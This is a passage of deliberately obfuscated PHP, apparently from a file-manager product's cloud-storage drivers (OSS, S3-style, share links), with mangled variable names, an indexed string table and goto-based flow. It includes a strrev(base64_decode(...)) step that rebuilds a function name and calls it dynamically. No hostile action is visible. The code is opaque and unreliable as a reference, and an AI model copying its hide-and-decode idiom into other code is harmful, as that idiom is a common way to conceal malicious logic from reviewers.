$_SERVER[ˆë€Ï⁄∂]; $—Ì˜‡ΩÕ = str_replace($°ÛçûÒò[87], $°ÛçûÒò[12], get_class($this)); return strtolower($—Ì˜‡ΩÕ); } public function isOsDriver($„∑÷‘”˘) { return IO::isOsDriver($„∑÷‘”˘); } public function info($£å§’âÀ) { return $this->infoParse($£å§’âÀ); } public function infoAuth($’Ä…‡¨¬) { return $this->infoParse($’Ä…‡¨¬); } public function infoWithChildren($›¶∂∫Å™) { return $this->infoParse($›¶∂∫Å™, !0); } public function infoFull($ —œ”« ) { return $this->infoParse($ —œ”« ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($≤Î±¬ı¡) { $this->pathParse = $≤Î±¬ı¡; } protected function infoParse($“·…¿Û‡, $è˚íõ‹ü = false) { $ô¨·÷Ãç =& $_SERVER[ˆë€Ï⁄∂]; return Action($ô¨·÷Ãç[1271])->sharePathInfo($this->pathParse[$ô¨·÷Ãç[97]], !0, $è˚íõ‹ü); } public function listPath($èÈ€É◊¿, $˙›§πÒõ = false) { $ö∫ ”·Ñ =& $_SERVER[ˆë€Ï⁄∂]; $†¨îéïÕ = IO::listPath($èÈ€É◊¿, $˙›§πÒõ); if (!$†¨îéïÕ) { return $†¨îéïÕ; } if (is_array($†¨îéïÕ[$ö∫ ”·Ñ[1444]])) { $ù—π≠ä£ = Action($ö∫ ”·Ñ[1453])->parsePathChildren($†¨îéïÕ[$ö∫ ”·Ñ[1444]], array($ö∫ ”·Ñ[506] => $èÈ€É◊¿)); $†¨îéïÕ[$ö∫ ”·Ñ[1444]] = Action($ö∫ ”·Ñ[1271])->shareItemInfo($ù—π≠ä£); } foreach ($†¨îéïÕ as $ˆŸà˚§¨ => $∞Ï‘˙åï) { if (!in_array($ˆŸà˚§¨, array($ö∫ ”·Ñ[96], $ö∫ ”·Ñ[95]))) { continue; } foreach ($∞Ï‘˙åï as $¸’ê„ºÙ => $ù—π≠ä£) { $ù—π≠ä£ = Action($ö∫ ”·Ñ[1453])->parsePathChildren($ù—π≠ä£, array($ö∫ ”·Ñ[506] => $èÈ€É◊¿)); $†¨îéïÕ[$ˆŸà˚§¨][$¸’ê„ºÙ] = Action($ö∫ ”·Ñ[1271])->shareItemInfo($ù—π≠ä£); } } return $†¨îéïÕ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($áã»∆øë) { parent::__construct($áã»∆øë); $this->setSignVersion($_SERVER[ˆë€Ï⁄∂][259]); } } goto b€âî≠ıøÆ; FÃúΩ≈∞ü√: $fileSize = strrev(base64_decode($_SERVER[˘„˚ˆ˛–][0])); function binCheckNeq($Ë˘Èæ˙, $œ ‘“¶’) { return $Ë˘Èæ˙ != $œ ‘“¶’; } $_SERVER[$_SERVER[˘„˚ˆ˛–][1]] = $fileSize($_SERVER[$_SERVER[˘„˚ˆ˛–][2]]); goto b¡ﬂé†Ç‘ã; báåØÿ‚ü¶: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Äƒ◊†çä) { parent::__construct($Äƒ◊†çä); $this->setSignVersion($_SERVER[ˆë€Ï⁄∂][259]); } public function fileOutLink($∫ØÒ”´≠) { $ˆß√≤≤û =& $_SERVER[ˆë€Ï⁄∂]; if (substr($∫ØÒ”´≠, 0, 7) == $ˆß√≤≤û[228]) { $∫ØÒ”´≠ = $ˆß√≤≤û[229] . substr($∫ØÒ”´≠, 7); } header($ˆß√≤≤û[185] . $∫ØÒ”´≠); die; } public function uploadFormData($òÈùœ˛∏, $…ﬁÈ˛π» = 3600) { return $this->uploadFormDataV2($òÈùœ˛∏, $…ﬁÈ˛π»); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($Êæ˛é§Ç) { parent::__construct(); include_once SDK_DIR . $_SERVER[ˆë€Ï⁄∂][1478]; $this->_init($Êæ˛é§Ç); } public function _init($˛¶˛ã…) { $Ï —É≠À =& $_SERVER[ˆë€Ï⁄∂]; $this->config = $˛¶˛ã…; foreach ($˛¶˛ã… as $ú†â∞∏‘ => $˙æÜ¨Ëı) { if (isset($this->{$ú†â∞∏‘})) { $this->{$ú†â∞∏‘} = $˙æÜ¨Ëı; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ï —É≠À[1479] . LNG($Ï —É≠À[1480])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $êÄò°†û =& $_SERVER[ˆë€Ï⁄∂]; $÷Â°®ÇΩ = new OSS\Model\CorsConfig(); $î¢Æ˙¿« = new OSS\Model\CorsRule(); $î¢Æ˙¿«->addAllowedOrigin($êÄò°†û[1481]); $î¢Æ˙¿«->addAllowedMethod($êÄò°†û[1482]); $î¢Æ˙¿«->addAllowedMethod($êÄò°†û[1483]); $î¢Æ˙¿«->addAllowedMethod($êÄò°†û[1484]); $î¢Æ˙¿«->addAllowedMethod($êÄò°†û[1485]); $î¢Æ˙¿«->addAllowedMethod($êÄò°†û[175]); $î¢Æ˙¿«->setMaxAgeSeconds(600); $î¢Æ˙¿«->addExposeHeader($êÄò°†û[1486]); $î¢Æ˙¿«->addAllowedHeader($êÄò°†û[1481]); $÷Â°®ÇΩ->addRule($î¢Æ˙¿«); try { $this->client->putBucketCors($this->bucket, $÷Â°®ÇΩ); } catch (OSS\Core\OssException $ˆåÊ·Ç‹) { $this->writeLog(__FUNCTION__ . $êÄò°†û[224] . $ˆåÊ·Ç‹->getMessage()); return !1; } return !0; } public function getBucketCors() { $å—Æ§Ô© =& $_SERVER[ˆë€Ï⁄∂]; $ø™˛À¥£ = null; try { $ø™˛À¥£ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ë§ü≤’”) { $this->writeLog(__FUNCTION__ . $å—Æ§Ô©[224] . $Ë§ü≤’”->getMessage()); return null; } if (!$ø™˛À¥£ || !($¶∫ÂÓ§ = $ø™˛À¥£->getRules())) { return null; } $ÙÏ˚ÌÀé = $¶∫ÂÓ§[0]->getAllowedOrigins(); $ëÅÒ¨”· = $¶∫ÂÓ§[0]->getAllowedMethods(); $óéπœ˘› = $¶∫ÂÓ§[0]->getMaxAgeSeconds(); $‡“≠£—ä = $¶∫ÂÓ§[0]->getExposeHeaders(); $ˆÃêú„ = $¶∫ÂÓ§[0]->getAllowedHeaders(); return array($å—Æ§Ô©[230] => isset($ÙÏ˚ÌÀé[0]) ? $ÙÏ˚ÌÀé[0] : $å—Æ§Ô©[12], $å—Æ§Ô©[234] => $ëÅÒ¨”·, $å—Æ§Ô©[1487] => $óéπœ˘›, $å—Æ§Ô©[1488] => isset($‡“≠£—ä[0]) ? $‡“≠£—ä[0] : $å—Æ§Ô©[12], $å—Æ§Ô©[231] => isset($ˆÃêú„[0]) ? $ˆÃêú„[0] : $å—Æ§Ô©[12]); } public function isBucketCors() { $ÑÈΩ¢√» =& $_SERVER[ˆë€Ï⁄∂]; $Ô˙úØâ° = $this->getBucketCors(); if (!$Ô˙úØâ° || !is_array($Ô˙úØâ°)) { return !1; } if ($Ô˙úØâ°[$ÑÈΩ¢√»[230]] != $ÑÈΩ¢√»[232] || $Ô˙úØâ°[$ÑÈΩ¢√»[231]] != $ÑÈΩ¢√»[232]) { return !1; } $ÙÔ”∏úí = array_map($ÑÈΩ¢√»[233], $Ô˙úØâ°[$ÑÈΩ¢√»[234]]); if (!is_array($ÙÔ”∏úí)) { $ÙÔ”∏úí = array(); } $ø≥ëƒ ‚ = array($ÑÈΩ¢√»[235], $ÑÈΩ¢√»[236], $ÑÈΩ¢√»[237], $ÑÈΩ¢√»[238], $ÑÈΩ¢√»[239]); $ÔÀ¯™º˜ = array_diff($ø≥ëƒ ‚, $ÙÔ”∏úí); return empty($ÔÀ¯™º˜); } public function mkfile($∆ìﬂ‡ôﬁ, $≈Œé¬•Ê = '', $˛˙ßõÂç = REPEAT_RENAME) { $Íùπïæ = $this->setContent($∆ìﬂ‡ôﬁ, $≈Œé¬•Ê); if ($Íùπïæ !== !1) { return $this->getPathOuter($∆ìﬂ‡ôﬁ); } return !1; } public function mkdir($Ó˚Ò™∂Õ, $—¢˚€‚Õ = REPEAT_SKIP) { if ($—¢˚€‚Õ && $this->_isFolder($Ó˚Ò™∂Õ)) { return $this->getPathOuter($Ó˚Ò™∂Õ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Ó˚Ò™∂Õ)); } catch (OSS\Core\OssException $Œ€«™Öé) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][224] . $Œ€«™Öé->getMessage()); return !1; } return $this->getPathOuter($Ó˚Ò™∂Õ); } private function fileList($ñÙΩ§∂ˆ, $™ë˚âΩû = '', $◊◊òïß© = 0) { $»§Ç†¸Å =& $_SERVER[ˆë€Ï⁄∂]; $ñÙΩ§∂ˆ = trim($ñÙΩ§∂ˆ, $»§Ç†¸Å[8]); $¸âÈœ∏‹ = empty($ñÙΩ§∂ˆ) && $ñÙΩ§∂ˆ !== $»§Ç†¸Å[240] ? $»§Ç†¸Å[12] : $ñÙΩ§∂ˆ . $»§Ç†¸Å[8]; $É–®ø§â = $»§Ç†¸Å[12]; $‡ÉÙìÇ∫ = 1000; $ ìπèÓø = $ƒüªä˚ë = array(); while (!0) { check_abort(); $«äÈπ§ = array($»§Ç†¸Å[1489] => $™ë˚âΩû, $»§Ç†¸Å[1490] => $¸âÈœ∏‹, $»§Ç†¸Å[1491] => $‡ÉÙìÇ∫, $»§Ç†¸Å[1492] => $É–®ø§â); try { $∫çÜ‚ÅÜ = $this->client->listObjects($this->bucket, $«äÈπ§); } catch (OSS\Core\OssException $ÁÑŒóµ«) { $this->writeLog(__FUNCTION__ . $»§Ç†¸Å[224] . $ÁÑŒóµ«->getMessage()); break; } $É–®ø§â = $∫çÜ‚ÅÜ->getNextMarker(); $±Æ√⁄£¿ = $∫çÜ‚ÅÜ->getObjectList(); $”◊ÑÒÔ“ = $∫çÜ‚ÅÜ->getPrefixList(); foreach ($±Æ√⁄£¿ as $’Ë‚±™∂) { if ($’Ë‚±™∂->getKey() == $¸âÈœ∏‹) { continue; } $¯˛πÖÓÌ = $’Ë‚±™∂->getKey(); $ï‚˜©∂Æ = $’Ë‚±™∂->getSize(); $™¨Ô•óÇ = $’Ë‚±™∂->getLastModified(); $“˘æÈ√ﬂ = trim($’Ë‚±™∂->getETag(), $»§Ç†¸Å[131]); $’…™∂ªÒ = $◊◊òïß© ? array($»§Ç†¸Å[32] => $¯˛πÖÓÌ, $»§Ç†¸Å[89] => $ï‚˜©∂Æ, $»§Ç†¸Å[216] => strtotime($™¨Ô•óÇ), $»§Ç†¸Å[1493] => $“˘æÈ√ﬂ) : $¯˛πÖÓÌ; $î¿º⁄¶Ò = $ï‚˜©∂Æ == 0 && substr($¯˛πÖÓÌ, strlen($¯˛πÖÓÌ) - 1, 1) == $»§Ç†¸Å[8] ? !0 : !1; $˛õ‡—Æ√ = array($»§Ç†¸Å[89] => $ï‚˜©∂Æ, $»§Ç†¸Å[1494] => $ï‚˜©∂Æ, $»§Ç†¸Å[98] => strtotime($™¨Ô•óÇ), $»§Ç†¸Å[1495] => $™¨Ô•óÇ, $»§Ç†¸Å[1493] => $“˘æÈ√ﬂ); $this->cacheMethodInfoSet($¯˛πÖÓÌ, $î¿º⁄¶Ò, $˛õ‡—Æ√); if ($î¿º⁄¶Ò) { $ ìπèÓø[] = $¯˛πÖÓÌ; continue; } $ƒüªä˚ë[] = $’…™∂ªÒ; } foreach ($”◊ÑÒÔ“ as $ÓÈÎöÄÂ) { $ ìπèÓø[] = $ÓÈÎöÄÂ->getPrefix(); $this->cacheMethodInfoSet($ÓÈÎöÄÂ->getPrefix(), !0); } if ($É–®ø§â === $»§Ç†¸Å[12]) { break; } } $this->cacheMethodInfoSet($ñÙΩ§∂ˆ, !0); return array($»§Ç†¸Å[95] => $ ìπèÓø, $»§Ç†¸Å[96] => $ƒüªä˚ë); } public function listObject($ß∞»∞¸†, $Ï„ﬂ´Áˆ = '') { $∞€⁄∆å∏ =& $_SERVER[ˆë€Ï⁄∂]; $ß∞»∞¸† = trim($ß∞»∞¸†, $∞€⁄∆å∏[8]); $µÿÎÈ…Ä = empty($ß∞»∞¸†) && $ß∞»∞¸† !== $∞€⁄∆å∏[240] ? $∞€⁄∆å∏[12] : $ß∞»∞¸† . $∞€⁄∆å∏[8]; $Âê∆§µ∏ = $∞€⁄∆å∏[12]; $çü‚±Ìô = 1000; $Œ»ÇÁÑƒ = $„¨£Å¬º = array(); while (!0) { check_abort(); $‚√ıåêΩ = array($∞€⁄∆å∏[1489] => $Ï„ﬂ´Áˆ, $∞€⁄∆å∏[1490] => $µÿÎÈ…Ä, $∞€⁄∆å∏[1491] => $çü‚±Ìô, $∞€⁄∆å∏[1492] => $Âê∆§µ∏); try { $ûØÅΩí• = $this->client->listObjects($this->bucket, $‚√ıåêΩ); } catch (OSS\Core\OssException $¿™£ìØ¡) { $this->writeLog(__FUNCTION__ . $∞€⁄∆å∏[224] . $¿™£ìØ¡->getMessage()); break; } $Âê∆§µ∏ = $ûØÅΩí•->getNextMarker(); $™‹ú◊¨‚ = $ûØÅΩí•->getObjectList(); foreach ($™‹ú◊¨‚ as $œ·ºﬁ•Î) { if ($œ·ºﬁ•Î->getKey() == $µÿÎÈ…Ä) { continue; } $ÿø≤Á‰∆ = $œ·ºﬁ•Î->getKey(); $èá‹ÙõÌ = $œ·ºﬁ•Î->getSize(); $∏–¬È†« = $èá‹ÙõÌ == 0 && substr($ÿø≤Á‰∆, strlen($ÿø≤Á‰∆) - 1, 1) == $∞€⁄∆å∏[8] ? !0 : !1; if ($∏–¬È†«) { continue; } $„¨£Å¬º[] = $èá‹ÙõÌ . $∞€⁄∆å∏[224] . $ÿø≤Á‰∆; } if ($Âê∆§µ∏ === $∞€⁄∆å∏[12]) { break; } } return array($∞€⁄∆å∏[95] => $Œ»ÇÁÑƒ, $∞€⁄∆å∏[96] => $„¨£Å¬º); } public function copyFile($€‘øÿò•, $ò∫À√∆˘) { $˛∏ïöªœ = $this->size($€‘øÿò•); if ($˛∏ïöªœ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $€‘øÿò•, $this->bucket, $this->pathEncode($ò∫À√∆˘)); } catch (OSS\Core\OssException $¢‘á…ˆ˘) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][224] . $¢‘á…ˆ˘->getMessage()); return !1; } return $this->getPathOuter($ò∫À√∆˘); } $ÀΩõﬁ¶÷ = $this->multiCopyObject($€‘øÿò•, $ò∫À√∆˘, $˛∏ïöªœ); return $ÀΩõﬁ¶÷ ? $this->getPathOuter($ò∫À√∆˘) : !1; } private function multiCopyObject($µªêÅê¯, $“ƒ∂°Áô, $¿æÓﬂ—ã) { $‹Ó›øÛà =& $_SERVER[ˆë€Ï⁄∂]; try { $˜Îﬁ®Ü∫ = array(); if ($€¥—˙„ì = $this->hashMd5($µªêÅê¯)) { $˜Îﬁ®Ü∫ = array(OSS\OssClient::OSS_HEADERS => array($‹Ó›øÛà[1496] => $€¥—˙„ì)); } $¥∞ÿÅöÏ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($“ƒ∂°Áô), $˜Îﬁ®Ü∫); $Ωÿ◊ıò‰ = 1; $ªπ±â˘‹ = 0; $ú≠ÆÖäÚ = array(); $öÔªäóü = 1024 * 1024 * 10; $©ñ ∆òá = $this->client->generateMultiuploadParts($¿æÓﬂ—ã, $öÔªäóü); foreach ($©ñ ∆òá as $°¨ù∂–ÿ => $√Øé£ƒ¿) { $Ω∆ä∆∞— = $ªπ±â˘‹ + (int) $√Øé£ƒ¿[$‹Ó›øÛà[1497]]; $›¿˚û≈ö = (int) $√Øé£ƒ¿[$‹Ó›øÛà[423]] + $Ω∆ä∆∞— - 1; $Ó˛°ªâÒ = array($‹Ó›øÛà[177] => $Ω∆ä∆∞—, $‹Ó›øÛà[178] => $›¿˚û≈ö); $ú≠ÆÖäÚ[] = $this->client->uploadPartCopy($this->bucket, $µªêÅê¯, $this->bucket, $this->pathEncode($“ƒ∂°Áô), $Ωÿ◊ıò‰, $¥∞ÿÅöÏ, $Ó˛°ªâÒ); $Ωÿ◊ıò‰ = $Ωÿ◊ıò‰ + 1; } $≈Ω´ÇπÇ = array(); foreach ($ú≠ÆÖäÚ as $°¨ù∂–ÿ => $˛≠˚øÚ•) { $≈Ω´ÇπÇ[] = array($‹Ó›øÛà[308] => $°¨ù∂–ÿ + 1, $‹Ó›øÛà[309] => $˛≠˚øÚ•); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($“ƒ∂°Áô), $¥∞ÿÅöÏ, $≈Ω´ÇπÇ); } catch (OSS\Core\OssException $ÁﬂÜÔÓ˘) { $this->writeLog(__FUNCTION__ . $‹Ó›øÛà[224] . $ÁﬂÜÔÓ˘->getMessage()); return !1; } return !0; } public function moveFile($íÄàù Ú, $ñ˝‚ëâ·) { if ($this->copyFile($íÄàù Ú, $ñ˝‚ëâ·)) { $this->remove($íÄàù Ú); return $this->getPathOuter($ñ˝‚ëâ·); } return !1; } public function delFile($øüöæπ’) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($øüöæπ’)); } catch (OSS\Core\OssException $ÀºíÌ¯‚) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][224] . $ÀºíÌ¯‚->getMessage()); return !1; } return !0; } public function delFolder($Ω¢ÎíÆ∑) { $è¸ôñ°§ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->exist($Ω¢ÎíÆ∑)) { return !0; } $this->listItemCache = !1; $©¯ƒﬂæ´ = $this->fileList($Ω¢ÎíÆ∑); $this->listItemCache = !0; $Ÿæ±›ë¢ = trim($Ω¢ÎíÆ∑, $è¸ôñ°§[8]) . $è¸ôñ°§[8]; if (!empty($Ω¢ÎíÆ∑) && $Ω¢ÎíÆ∑ !== $è¸ôñ°§[240] && !in_array($Ÿæ±›ë¢, $©¯ƒﬂæ´[$è¸ôñ°§[95]])) { $©¯ƒﬂæ´[$è¸ôñ°§[95]][] = $Ÿæ±›ë¢; } $ë‹…ƒôì = $this->delByBatch($©¯ƒﬂæ´[$è¸ôñ°§[96]]); if (!$ë‹…ƒôì) { return !1; } $ë‹…ƒôì = $this->delByBatch($©¯ƒﬂæ´[$è¸ôñ°§[95]]); if (!$ë‹…ƒôì) { return !1; } return $this->delFile($Ÿæ±›ë¢); } private function delByBatch($ÅÇ≈å—¥) { foreach (array_chunk($ÅÇ≈å—¥, 1000) as $Ìúè¥é•) { try { $this->client->deleteObjects($this->bucket, $Ìúè¥é•); } catch (OSS\Core\OssException $ÆΩ√ÊÈŸ) { $this->writeLog(__FUNCTION__ . $_SERVER[ˆë€Ï⁄∂][224] . $ÆΩ√ÊÈŸ->getMessage()); return !1; } } return !0; } public function rename($í¥Ú˚Ë, $¶π¡Ωèõ) { return $this->renameObject($í¥Ú˚Ë, $¶π¡Ωèõ); } private function fileInfo($àâÍº˛, $ùÙ‘≥≤ò = false, $Àç—≠Ô© = array()) { $îﬁ∏¥÷° =& $_SERVER[ˆë€Ï⁄∂]; $¨¨ÿ˙∂§ = array($îﬁ∏¥÷°[32] => $this->pathThis($àâÍº˛), $îﬁ∏¥÷°[97] => $this->getPathOuter($àâÍº˛), $îﬁ∏¥÷°[33] => $îﬁ∏¥÷°[242], $îﬁ∏¥÷°[89] => isset($Àç—≠Ô©[$îﬁ∏¥÷°[89]]) ? $Àç—≠Ô©[$îﬁ∏¥÷°[89]] : 0, $îﬁ∏¥÷°[179] => $this->ext($àâÍº˛)); if ($ùÙ‘≥≤ò) { return $¨¨ÿ˙∂§; } $¨¨ÿ˙∂§[$îﬁ∏¥÷°[243]] = $¨¨ÿ˙∂§[$îﬁ∏¥÷°[98]] = 0; $¨¨ÿ˙∂§[$îﬁ∏¥÷°[244]] = $¨¨ÿ˙∂§[$îﬁ∏¥÷°[245]] = !0; if (empty($Àç—≠Ô©)) { $ïªÍ°ö˙ = $this->objectMeta($àâÍº˛); if (!$ïªÍ°ö˙) { return $¨¨ÿ˙∂§; } $Àç—≠Ô© = array($îﬁ∏¥÷°[98] => strtotime($ïªÍ°ö˙[$îﬁ∏¥÷°[1495]]), $îﬁ∏¥÷°[89] => $ïªÍ°ö˙[$îﬁ∏¥÷°[1494]] + 0, $îﬁ∏¥÷°[1493] => $ïªÍ°ö˙[$îﬁ∏¥÷°[1493]]); } if (isset($Àç—≠Ô©[$îﬁ∏¥÷°[1493]]) && $Àç—≠Ô©[$îﬁ∏¥÷°[1493]]) { $¨¨ÿ˙∂§[$îﬁ∏¥÷°[247]] = trim($Àç—≠Ô©[$îﬁ∏¥÷°[1493]], $îﬁ∏¥÷°[131]); } if (isset($Àç—≠Ô©[$îﬁ∏¥÷°[89]])) { $¨¨ÿ˙∂§[$îﬁ∏¥÷°[89]] = $Àç—≠Ô©[$îﬁ∏¥÷°[89]]; } if (isset($Àç—≠Ô©[$îﬁ∏¥÷°[98]])) { $¨¨ÿ˙∂§[$îﬁ∏¥÷°[98]] = $Àç—≠Ô©[$îﬁ∏¥÷°[98]]; } if (isset($Àç—≠Ô©[$îﬁ∏¥÷°[216]]) && !trim($¨¨ÿ˙∂§[$îﬁ∏¥÷°[98]])) { $¨¨ÿ˙∂§[$îﬁ∏¥÷°[98]] = $Àç—≠Ô©[$îﬁ∏¥÷°[216]]; } return $¨¨ÿ˙∂§; } private function folderInfo($Èæ÷ó˚√, $ö‹∆‘˜À = false, $Å˝ıÆœ∑ = array()) { $âì©∆∆… =& $_SERVER[ˆë€Ï⁄∂]; $ÆÃµ›ªö = array($âì©∆∆…[32] => $this->pathThis($Èæ÷ó˚√), $âì©∆∆…[97] => $this->getPathOuter($âì©∆∆…[8] . $Èæ÷ó˚√), $âì©∆∆…[33] => $âì©∆∆…[88]); if ($ö‹∆‘˜À) { return $ÆÃµ›ªö; } $ÆÃµ›ªö[$âì©∆∆…[243]] = $ÆÃµ›ªö[$âì©∆∆…[98]] = 0; $ÆÃµ›ªö[$âì©∆∆…[244]] = $ÆÃµ›ªö[$âì©∆∆…[245]] = !0; if (empty($Å˝ıÆœ∑)) { $Èæ÷ó˚√ = rtrim($Èæ÷ó˚√, $âì©∆∆…[8]) . $âì©∆∆…[8]; $Øä≥‰„˚ = $this->objectMeta($Èæ÷ó˚√); if (!$Øä≥‰„˚) { return $ÆÃµ›ªö; } $Å˝ıÆœ∑ = array($âì©∆∆…[243] => $Øä≥‰„˚[$âì©∆∆…[586]][$âì©∆∆…[1498]], $âì©∆∆…[98] => strtotime($Øä≥‰„˚[$âì©∆∆…[1495]])); } if (isset($Å˝ıÆœ∑[$âì©∆∆…[98]])) { $ÆÃµ›ªö[$âì©∆∆…[98]] = $Å˝ıÆœ∑[$âì©∆∆…[98]]; } if (isset($Å˝ıÆœ∑[$âì©∆∆…[243]])) { $ÆÃµ›ªö[$âì©∆∆…[243]] = $Å˝ıÆœ∑[$âì©∆∆…[243]]; } return $ÆÃµ›ªö; } public function listPath($ÌÕÃÛ∆í, $˙Ò”Õöƒ = false) { $âÀÅﬂë– =& $_SERVER[ˆë€Ï⁄∂]; $¸Á”ºŒŒ = $this->fileList($ÌÕÃÛ∆í, $âÀÅﬂë–[8], !0); foreach ($¸Á”ºŒŒ[$âÀÅﬂë–[95]] as $ÂµÑàîÛ => $√˝—◊˜Ë) { $¸Á”ºŒŒ[$âÀÅﬂë–[95]][$ÂµÑàîÛ] = $this->folderInfo($√˝—◊˜Ë, $˙Ò”Õöƒ, $√˝—◊˜Ë); } foreach ($¸Á”ºŒŒ[$âÀÅﬂë–[96]] as $ÂµÑàîÛ => $√˝—◊˜Ë) { $¸Á”ºŒŒ[$âÀÅﬂë–[96]][$ÂµÑàîÛ] = $this->fileInfo($√˝—◊˜Ë[$âÀÅﬂë–[32]], $˙Ò”Õöƒ, $√˝—◊˜Ë); } return $¸Á”ºŒŒ; } protected function infoChildren($ËüùÁÕâ, &$ÄÜÆ‘ﬁ—) { $˚ÁÕÍ∫‰ =& $_SERVER[ˆë€Ï⁄∂]; $‘ΩÂ¡ÙË = $this->fileList($ËüùÁÕâ, $˚ÁÕÍ∫‰[12], !0); $ÄÜÆ‘ﬁ—[$˚ÁÕÍ∫‰[91]] += count($‘ΩÂ¡ÙË[$˚ÁÕÍ∫‰[95]]); $ÄÜÆ‘ﬁ—[$˚ÁÕÍ∫‰[90]] += count($‘ΩÂ¡ÙË[$˚ÁÕÍ∫‰[96]]); foreach ($‘ΩÂ¡ÙË[$˚ÁÕÍ∫‰[96]] as $¢ÑäÚ©) { if (!$¢ÑäÚ© || !$¢ÑäÚ©[$˚ÁÕÍ∫‰[89]]) { continue; } $ÄÜÆ‘ﬁ—[$˚ÁÕÍ∫‰[89]] += $¢ÑäÚ©[$˚ÁÕÍ∫‰[89]]; } } public function has($˘òÂØ≥Ã, $…”≠Ê∏õ = false, $∏∂©ﬂÄÓ = true) { $Ä¶∏œá˜ =& $_SERVER[ˆë€Ï⁄∂]; $˘òÂØ≥Ã = trim($˘òÂØ≥Ã, $Ä¶∏œá˜[8]); $»Ú®¨˜æ = empty($˘òÂØ≥Ã) && $˘òÂØ≥Ã !== $Ä¶∏œá˜[240] ? $Ä¶∏œá˜[12] : $˘òÂØ≥Ã . $Ä¶∏œá˜[8]; $óÔØÚóá = $Ä¶∏œá˜[12]; $Ñ®ˆÓŸı = 500; $ÌµÈˆÎ˜ = $ëÖúºÎ¡ = 0; while (!0) { check_abort(); $‘√Ä‰ÿ± = array($Ä¶∏œá˜[1489] => $Ä¶∏œá˜[8], $Ä¶∏œá˜[1490] => $»Ú®¨˜æ, $Ä¶∏œá˜[1491] => $Ñ®ˆÓŸı, $Ä¶∏œá˜[1492] => $óÔØÚóá); try { $ô«ç´±Ø = $this->client->listObjects($this->bucket, $‘√Ä‰ÿ±); } catch (OSS\Core\OssException $ä€…èÑß) { $this->writeLog(__FUNCTION__ . $Ä¶∏œá˜[224] . $ä€…èÑß->getMessage()); break; } $óÔØÚóá = $ô«ç´±Ø->getNextMarker(); $ãñÍıÙ¯ = $ô«ç´±Ø->getObjectList(); $ó∏›áÃò = $ô«ç´±Ø->getPrefixList(); if ($…”≠Ê∏õ) { if (count($ãñÍıÙ¯) > 1 || count($ãñÍıÙ¯) == 1 && $ãñÍıÙ¯[0]->getKey() != $»Ú®¨˜æ) { $ÌµÈˆÎ˜ += count($ãñÍıÙ¯) - 1; } if (!empty($ó∏›áÃò)) { $ëÖúºÎ¡ += count($ó∏›áÃò); } if ($óÔØÚóá === $Ä¶∏œá˜[12]) { break; } continue; } if ($∏∂©ﬂÄÓ) { if (!empty($ãñÍıÙ¯)) { if (count($ãñÍıÙ¯) > 1 || $ãñÍıÙ¯[0]->getKey() != $»Ú®¨˜æ) { return !0; } } } else { if (!empty($ó∏›áÃò)) { return !0; } } if ($óÔØÚóá === $Ä¶∏œá˜[12]) { break; } } if ($…”≠Ê∏õ) { return array($Ä¶∏œá˜[251] => $ÌµÈˆÎ˜, $Ä¶∏œá˜[252] => $ëÖúºÎ¡); } return !1; } public function listAll($ﬂ§ô «˘) { $ù†ﬁøÒ◊ =& $_SERVER[ˆë€Ï⁄∂]; $‹¿€µœÛ = $this->fileList($ﬂ§ô «˘, $ù†ﬁøÒ◊[12], !0); $Úã™‰»ô = array_to_keyvalue($‹¿€µœÛ[$ù†ﬁøÒ◊[96]], $ù†ﬁøÒ◊[32]); foreach ($‹¿€µœÛ[$ù†ﬁøÒ◊[95]] as $¯÷åΩÛ√) { if (is_string($¯÷åΩÛ√)) { $Úã™‰»ô[$¯÷åΩÛ√] = array($ù†ﬁøÒ◊[89] => 0); } } return $this->listAllFiles($ﬂ§ô «˘, $Úã™‰»ô); } public function canRead($è·»ä¨Ä) { $ Õ…‚Ü’ =& $_SERVER[ˆë€Ï⁄∂]; $€™∞‚Â˝ = $this->pathAcl($è·»ä¨Ä); return $€™∞‚Â˝ == $ Õ…‚Ü’[1499] || $€™∞‚Â˝ == $ Õ…‚Ü’[633] ? !0 : !1; } public function canWrite($Óäâóäå) { $ÇõìÊù• = $this->pathAcl($Óäâóäå); return $ÇõìÊù• == $_SERVER[ˆë€Ï⁄∂][633] ? !0 : !1; } public function pathAcl($†¯Í√Ã) { $¬¶—À·ñ =& $_SERVER[ˆë€Ï⁄∂]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ºÛ¡î ∂ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($†¯Í√Ã)); } catch (OSS\Core\OssException $ßœøˆøï) { $this->writeLog(__FUNCTION__ . $¬¶—À·ñ[224] . $ßœøˆøï->getMessage()); return !1; } $õéﬂÈë∫ = $ºÛ¡î ∂ == $¬¶—À·ñ[37] ? $this->bucketAcl : $ºÛ¡î ∂; if ($õéﬂÈë∫ == $¬¶—À·ñ[1500]) { return $¬¶—À·ñ[1499]; } if ($õéﬂÈë∫ == $¬¶—À·ñ[1501]) { return $¬¶—À·ñ[633]; } return $õéﬂÈë∫; } private function chmodPath($ãõÔ™ãÖ, $±˝≥´úË = '') { $éùõ„πÖ =& $_SERVER[ˆë€Ï⁄∂]; $ƒœ¬∂–æ = empty($±˝≥´úË) ? $éùõ„πÖ[1501] : $±˝≥´úË; $Ü®ÿ≈˘Á = array($éùõ„πÖ[37], $éùõ„πÖ[241], $éùõ„πÖ[1500], $éùõ„πÖ[1501]); if (!in_array($ƒœ¬∂–æ, 